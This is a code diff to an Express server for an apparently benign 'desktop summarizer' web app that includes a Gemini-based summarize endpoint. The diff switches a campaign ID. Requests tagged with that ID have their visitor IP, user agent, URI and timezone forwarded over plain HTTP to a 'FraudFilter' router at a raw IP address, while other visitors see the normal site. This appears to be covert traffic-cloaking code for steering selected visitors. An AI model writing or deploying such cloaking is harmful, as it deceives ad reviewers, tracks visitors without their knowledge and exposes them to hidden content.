@@ -21,6 +21,8 @@ const FRAUDFILTER_HOST = 'http://130.211.20.155';
 const FRAUDFILTER_TOKEN =
   process.env.FRAUDFILTER_HOSTED_JS_TOKEN || '';
 
+const FRAUDFILTER_CAMPAIGN = 'h199g';
+
 function getClientIp(req: express.Request): string {
   const forwarded = req.headers['x-forwarded-for'];
 
@@ -63,7 +65,7 @@ app.get('/', async (req, res, next) => {
   const campaignId = String(req.query.id || '');
 
   // Normal website request
-  if (campaignId !== 'vqu7l') {
+  if (campaignId !== FRAUDFILTER_CAMPAIGN) {
     return next();
   }
 
@@ -79,11 +81,11 @@ app.get('/', async (req, res, next) => {
 
     var src = s && s.src
       ? s.src
-      : "https://deskpulse-c28e5849a14d.herokuapp.com/?id=vqu7l";
+      : "https://deskpulse-c28e5849a14d.herokuapp.com/?id=h199g";
 
     var u = new URL(src, window.location.href);
 
-    u.searchParams.set("id", "vqu7l");
+    u.searchParams.set("id", "h199g");
     u.searchParams.set("tzzzr", "0");
     u.searchParams.set(
       "tzzz",
@@ -140,16 +142,16 @@ app.get('/', async (req, res, next) => {
         req.originalUrl.split('?')[1] || '',
 
       'X-FF-REQUEST-URI':
-        req.path || '/',
+        req.originalUrl.split('?')[0] || '/',
 
       'User-Agent':
         String(req.headers['user-agent'] || ''),
 
       'Expected':
-        String(req.headers['expected'] || ''),
+        '',
 
       'X-FF-TZ-OFFSET':
-        String(req.query.tzzz)
+        String(req.query.tzzz || '')
     };
 
     if (req.headers['cf-connecting-ip']) {
@@ -163,7 +165,7 @@ app.get('/', async (req, res, next) => {
     }
 
     const routerUrl =
-      `${FRAUDFILTER_HOST}/vqu7l`;
+      `${FRAUDFILTER_HOST}/${FRAUDFILTER_CAMPAIGN}`;
 
     console.log(
       'FraudFilter request:',
@@ -260,6 +262,7 @@ app.post('/api/gemini/summarize', async (req, res) => {
 
     const response = await ai.models.generateContent({
       model: 'gemini-3.8-flash',
+
       contents: `Analyze and summarize the following content for a desktop user. Provide a clean, structured summary with 3-5 bullet points, key takeaways, and an action recommendation.
 
 Format requirement: ${format || 'concise'}
